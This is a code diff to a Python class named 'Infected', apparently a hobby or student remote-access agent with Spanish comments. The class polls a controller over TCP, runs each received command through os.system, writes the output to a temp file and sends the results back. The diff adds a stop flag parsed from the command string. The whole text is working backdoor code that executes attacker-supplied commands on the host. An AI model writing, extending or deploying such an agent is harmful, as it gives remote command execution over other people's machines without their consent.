@@ -10,12 +10,13 @@ class Infected:
         self.portReceiveCommand = portReceiveCommand
         self.portSendOutput = portSendOutput
         self.lastAction = None
+        self.isNotFinish = True
         
     def getDataFromSocket(self, socket):
         return socket.recv(2000).decode("utf-8")
                 
     def listenForAction(self):
-        while True:
+        while self.isNotFinish:
             # Create a TCP/IP socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
             # Connect the socket to the port where the server is listening
@@ -35,7 +36,9 @@ class Infected:
                 sleep(10)
     
     def executeAction(self, action):
-        action = action + " > %tmp%/file.txt"
+        actionAux = action.split(" @ ")
+        action = actionAux[0] + " > %tmp%/file.txt"
+        self.isNotFinish = actionAux[1].startswith("T")
         print(action)        # porque este print?
         os.system(action)  
         self.sendOutput() # se cambia por output mas adelante
@@ -60,7 +63,10 @@ class Infected:
             # Receive action
             sock.sendall(bytes(output,"utf-8"))     #no hay una forma de enviarlo , pero no como bytes?           
         finally:
-            sock.close()       
+            sock.close()  
+                
+  
+     
     
 inf = Infected("localhost", 10000, 10001)
 inf.listenForAction()
